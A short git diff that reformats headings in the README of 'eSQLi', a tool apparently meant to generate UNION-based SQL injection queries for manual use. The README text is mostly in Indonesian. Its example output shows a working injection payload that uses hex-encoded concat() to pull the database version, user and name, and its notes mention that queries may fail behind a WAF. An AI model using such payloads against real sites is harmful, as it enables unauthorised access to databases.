@@ -1,7 +1,7 @@
 # eSQLi
 Automatic generate query for manual SQL injection
 
-#Penggunaan :
+# Penggunaan 
 
 poi@kirin : python esqli.py
 
@@ -55,7 +55,7 @@ example :
 ---------------Final Query---------------
 1,concat(0x6b6972696e,0x3a,version(),0x3c62723e55736572203a20,user(),0x3c62723e4461746162617365203a20,database()),3
 
-#Note 
+# Note
 
 - Tools ini hanya untuk mempermudah dalam menampilkan query dalam SQL injection bukan untuk melakukan test injeksi seperti ( SQLmap , Havij dll) 
 - Terkadang Query yang dihasilkan tidak bekerja dibeberapa situs. terutama situs yang dilindungi oleh WAF
